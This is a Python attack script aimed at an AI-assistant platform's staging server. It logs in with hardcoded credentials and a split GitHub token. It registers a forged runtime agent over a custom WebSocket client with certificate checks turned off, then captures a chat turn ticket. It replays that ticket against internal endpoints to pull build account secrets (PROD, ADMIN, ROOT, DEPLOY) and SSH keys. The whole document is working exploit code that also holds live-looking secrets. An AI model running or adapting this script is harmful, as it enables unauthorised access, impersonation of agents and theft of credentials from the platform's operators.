# -*- coding: utf-8 -*-
import json,os,sys,base64,re,subprocess,time,threading,struct,socket,ssl
HOST="stage-assistant.lumiiai.cn"; BASE="https://"+HOST
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
CRED=("lc-zone-leader@" + "lumii.dev","Lianchuang" + "#" + "2026")
GHO="gho_" + "w5O107fup8" + "ULp6tEFsW9V" + "3QEEXSHtx3m9xka"
REPO_FULL="aro-network/aro-ext-signal-server"
def R(k,v):
    try: s=json.dumps(v,ensure_ascii=False)
    except Exception: s=repr(v)
    sys.stdout.write("R:%s:%s\n"%(k,base64.b64encode(s.encode()).decode())); sys.stdout.flush()
def curl(args,timeout=40,stdin=None):
    try:
        p=subprocess.run(["curl","--http2","-sS"]+args,input=stdin,capture_output=True,timeout=timeout+10)
        return p.returncode,p.stdout,p.stderr
    except Exception as e: return -1,b"",repr(e).encode()
def call(path,method="GET",body=None,hdrs=None,timeout=40,maxlen=8000,cookie=None):
    args=["-m",str(timeout),"-A",UA,"-w","\n__CODE__%{http_code}"]
    if cookie: args+=["-H","Cookie: "+cookie]
    h={"Accept":"application/json","Referer":BASE+"/","Origin":BASE}
    if hdrs: h.update(hdrs)
    for k,v in h.items(): args+=["-H","%s: %s"%(k,v)]
    data=None
    if body is not None:
        data=json.dumps(body).encode(); args+=["-H","Content-Type: application/json","--data-binary","@-"]
    if method!="GET": args+=["-X",method]
    args+=[BASE+path]
    rc,out,err=curl(args,timeout=timeout,stdin=data)
    txt=out.decode("utf-8","replace"); code=""; i=txt.rfind("__CODE__")
    if i>=0: code=txt[i+8:].strip()[:3]; txt=txt[:i]
    return {"code":code,"body":txt[:maxlen],"len":len(txt),"err":err.decode("utf-8","replace")[:120]}
def J(r):
    try: return json.loads(r["body"])
    except Exception: return None
def login(ident,pw):
    rc,out,err=curl(["-m","45","-A",UA,"-i","-X","POST","-H","Content-Type: application/json",
                     "--data-binary",json.dumps({"identifier":ident,"password":pw}),BASE+"/api/auth/login"],timeout=50)
    txt=out.decode("utf-8","replace"); m=re.search(r"HTTP/[0-9.]+ (\d{3})",txt); code=m.group(1) if m else ""
    mc=re.search(r"lumii_session=([^;]+)",txt); ck=("lumii_session="+mc.group(1)) if mc else ""
    return code,ck

class WS:
    def __init__(self,host,path,headers=None):
        self.host=host; self.path=path; self.headers=headers or {}
        self.buf=b""; self.frames=[]; self.lock=threading.Lock(); self.closed=False; self.head=""
    def connect(self):
        s=socket.create_connection((self.host,443),timeout=15)
        ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
        self.sock=ctx.wrap_socket(s,server_hostname=self.host)
        key=base64.b64encode(os.urandom(16)).decode()
        req=("GET %s HTTP/1.1\r\nHost: %s\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
             "Sec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\nUser-Agent: %s\r\n"%(self.path,self.host,key,UA))
        for k,v in self.headers.items(): req+="%s: %s\r\n"%(k,v)
        req+="\r\n"; self.sock.sendall(req.encode())
        data=b""
        while b"\r\n\r\n" not in data:
            ch=self.sock.recv(4096)
            if not ch: raise IOError("hs closed %r"%data)
            data+=ch
        head,rest=data.split(b"\r\n\r\n",1); self.head=head.decode("latin1")
        if " 101" not in self.head.split("\r\n")[0]: raise IOError("hs not101 %s"%self.head[:160])
        self.buf=rest; return self.head.split("\r\n")[0]
    def _send_raw(self,b1,payload):
        with self.lock:
            hdr=bytearray([b1]); n=len(payload); mask=os.urandom(4)
            if n<126: hdr.append(0x80|n)
            elif n<65536: hdr.append(0x80|126); hdr+=struct.pack(">H",n)
            else: hdr.append(0x80|127); hdr+=struct.pack(">Q",n)
            hdr+=mask; masked=bytes(b^mask[i%4] for i,b in enumerate(payload))
            self.sock.sendall(bytes(hdr)+masked)
    def send(self,obj):
        payload=(obj if isinstance(obj,str) else json.dumps(obj)).encode(); self._send_raw(0x81,payload)
    def pong(self,data): self._send_raw(0x8A,data)
    def _rx(self,n):
        while len(self.buf)<n:
            ch=self.sock.recv(65536)
            if not ch: raise IOError("closed")
            self.buf+=ch
        out=self.buf[:n]; self.buf=self.buf[n:]; return out
    def frame(self):
        b1,b2=self._rx(2); op=b1&0x0f; ln=b2&0x7f
        if ln==126: ln=struct.unpack(">H",self._rx(2))[0]
        elif ln==127: ln=struct.unpack(">Q",self._rx(8))[0]
        masked=b2&0x80; mask=b""
        if masked: mask=self._rx(4)
        data=self._rx(ln)
        if masked: data=bytes(c^mask[i%4] for i,c in enumerate(data))
        return op,data
    def reader_loop(self,tag,maxsec=120):
        t0=time.time()
        while time.time()-t0<maxsec:
            try: op,data=self.frame()
            except Exception as e:
                self.frames.append({"tag":tag,"op":"close","err":str(e)}); self.closed=True; return
            if op==0x1:
                try: msg=json.loads(data.decode("utf-8","replace"))
                except Exception: msg={"_raw":data[:300].decode("utf-8","replace")}
                self.frames.append({"tag":tag,"op":"text","msg":msg})
            elif op==0x9: self.pong(data)
            elif op==0x8: self.frames.append({"tag":tag,"op":"closeserver"}); self.closed=True; return
    def start(self,tag): threading.Thread(target=self.reader_loop,args=(tag,),daemon=True).start()

code,ck=login(*CRED); R("login",{"code":code,"ck":bool(ck)})
if not ck: sys.exit(0)
C=ck
me=call("/api/me",cookie=C); ME=J(me) or {}
R("me",{"code":me["code"],"sub":(ME.get("user") or {}).get("id") or ME.get("id"),"org":ME.get("org"),"perms":ME.get("permissions")})

# ---- connections: build candidate list (prefer with content write) ----
conn_list=call("/api/code-hosts/connections",cookie=C); CJ=J(conn_list)
cands=[]
if CJ:
    lst=CJ.get("items") or CJ.get("connections") or (CJ if isinstance(CJ,list) else [])
    if isinstance(lst,list):
        for c0 in lst: cands.append((c0.get("id"),c0.get("label","")))
R("conns",cands)
# create our own connection too
mk=call("/api/code-hosts/connections","POST",{"host":"github","authKind":"personal_token","token":GHO,"label":"pr28964own"},cookie=C)
R("conn_create",{"code":mk["code"],"body":mk["body"][:600]})
mj=J(mk) or {}
own=(mj.get("id") or (mj.get("connection") or {}).get("id"))
if own: cands=[(own,"pr28964own")]+cands
# order: ones whose label does NOT indicate no-content first
def score(t):
    lab=t[1].lower()
    if "no-content" in lab: return 2
    if "content" in lab: return 0
    return 1
cands=sorted(cands,key=score)
R("conn_cands",cands)

# ---- project ----
PJ=J(call("/api/projects?scope=all",cookie=C)) or {}
items=PJ.get("projects") if isinstance(PJ,dict) else PJ
if isinstance(items,dict): items=items.get("items")
items=items or []
pid=None
for p in items:
    pid0=p.get("id"); rr=J(call("/api/projects/%s/repos"%pid0,cookie=C)) or {}
    rlist=rr.get("items") or rr.get("repos") or []
    if rlist: pid=pid0; R("reuse_project",{"pid":pid,"n":len(rlist)}); break
if not pid:
    cp=call("/api/projects","POST",{"name":"pr28964","instructions":"你是一个测试助手，请简短回复。"},cookie=C)
    R("proj_create",{"code":cp["code"],"body":cp["body"][:400]})
    pj=J(cp) or {}; pid=pj.get("project",{}).get("id") or pj.get("id")
R("pid",pid)
# ---- add repo ----
added=None
for cid,lab in cands:
    if not cid: continue
    add=call("/api/projects/%s/repos/github-token"%pid,"POST",
             {"fullName":REPO_FULL,"verifyConnectionId":cid,"commitAs":"delegator_only","dirName":"pr28964"},cookie=C)
    R("repo_add_%s"%lab,{"cid":cid,"code":add["code"],"body":add["body"][:400]})
    if add["code"] in ("200","201"): added=add; break
rr=J(call("/api/projects/%s/repos"%pid,cookie=C)) if pid else None
R("repos_now",rr if rr else {})

# ---- runtime ----
rt=call("/api/runtimes","POST",{"name":"pr28964","visibility":"private"},cookie=C)
RJ=J(rt) or {}
RID=RJ.get("agentId") or RJ.get("id") or ""
script=RJ.get("script","")
RTOK=""
mm=re.search(r"AGENT_TOKEN=['\"]?([A-Za-z0-9_\-]{20,})",script); RTOK=mm.group(1) if mm else ""
R("rt_create",{"code":rt["code"],"rid":RID,"tok_len":len(RTOK)})

# ---- agent WS register ----
AGW=None
if RID and RTOK:
    try:
        AGW=WS(HOST,"/api/ws/agent",{"Origin":BASE}); hs=AGW.connect(); R("ag_hs",hs); AGW.start("agent")
        AGW.send({"type":"register","agentId":RID,"token":RTOK,
                  "capabilities":["project_dirs","ssh_agent","ssh_keys","secret_cards"],
                  "metadata":{"agent_id":RID,"token":RTOK,"hostname":"pr28964","lak_version":"v1.2.309",
                              "lak_commit":"deadbee","supported_agents":["codex","claude"],"default_agent":"codex"}})
        for i in range(6):
            time.sleep(1.5)
            acks=[f["msg"] for f in AGW.frames if isinstance(f.get("msg"),dict) and f["msg"].get("type")=="register_ack"]
            if acks: break
        R("ag_ack",acks if 'acks' in dir() else [])
    except Exception as e: R("ag_err",repr(e)[:200])
# keys
keys=call("/api/runtimes/keys/current",hdrs={"x-agent-id":RID,"x-agent-token":RTOK},cookie=C)
R("rt_keys",{"code":keys["code"],"body":keys["body"][:300]})
# state
def rt_state():
    rl=J(call("/api/runtimes",cookie=C))
    lst=(rl.get("runtimes") if isinstance(rl,dict) else rl) or (rl.get("items") if isinstance(rl,dict) else None) or []
    if isinstance(lst,dict): lst=lst.get("items") or []
    for r in lst:
        if r.get("id")==RID or r.get("agentId")==RID: return r.get("state")
    return None
st=None
for _ in range(6):
    st=rt_state()
    if st=="active": break
    time.sleep(2)
R("rt_state",st)

# ---- assistant ----
asst=call("/api/assistants","POST",{"name":"pr28964","runtimeId":RID},cookie=C)
R("asst_create",{"code":asst["code"],"body":asst["body"][:600]})
AJ=J(asst) or {}; ASID=AJ.get("id") or (AJ.get("assistant") or {}).get("id")
R("asid",ASID)
if ASID:
    call("/api/assistants/%s"%ASID,"PATCH",{"useScope":"org"},cookie=C)

# ---- conversation ----
CONV=None
if ASID and pid:
    cv=call("/api/conversations","POST",{"projectId":pid,"assistantId":ASID,"title":"pr28964"},cookie=C)
    R("conv_create",{"code":cv["code"],"body":cv["body"][:600]})
    cj=J(cv) or {}; CONV=cj.get("id") or (cj.get("conversation") or {}).get("id")
R("conv",CONV)

# ---- chat send + capture ----
if CONV and ASID:
    try:
        CH=WS(HOST,"/api/ws/chat?conversationId="+CONV,{"Origin":BASE,"Cookie":C}); hs=CH.connect(); R("ch_hs",hs); CH.start("chat")
        time.sleep(2)
        CH.send({"type":"send","content":"你好，请回复 ok","assistant_id":ASID,"session_key":CONV})
        R("ch_sent",True)
        found=None; t0=time.time()
        while time.time()-t0<60:
            if AGW:
                for f in list(AGW.frames):
                    m=f.get("msg") or {}
                    if isinstance(m,dict):
                        t=m.get("turn_ticket")
                        if not t:
                            s=json.dumps(m,ensure_ascii=False); mm2=re.search(r'(v2\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+)',s)
                            t=mm2.group(1) if mm2 else None
                        if t: found=t; break
            if found: break
            time.sleep(2)
        R("ticket",{"found":bool(found),"len":len(found) if found else 0})
        if found:
            p=found.split("."); payload=p[1] if len(p)>1 else ""; payload+="="*(-len(payload)%4)
            try: claims=json.loads(base64.urlsafe_b64decode(payload.encode()).decode())
            except Exception as e: claims={"_err":str(e)}
            R("ticket_claims",claims)
            bh={"Authorization":"Bearer "+RTOK,"x-agent-id":RID,"x-lumii-turn-proof":found}
            acc=call("/internal/build/accounts","POST",{"names":["PROD","ADMIN","UBUNTU","DEPLOY","ROOT","LUMII","SSH","LNT"]},hdrs=bh)
            R("build_accounts",{"code":acc["code"],"body":acc["body"][:2000]})
            sk=call("/internal/build/ssh-keys",hdrs=bh); R("build_sshkeys",{"code":sk["code"],"body":sk["body"][:600]})
        R("ag_all",[(f.get("msg") or {}) if isinstance(f.get("msg"),dict) else {"op":f.get("op")} for f in (AGW.frames if AGW else [])][:12])
        R("ch_all",[(f.get("msg") or {}) if isinstance(f.get("msg"),dict) else {"op":f.get("op")} for f in CH.frames][:8])
    except Exception as e: R("chat_err",repr(e)[:300])
R("done",True)
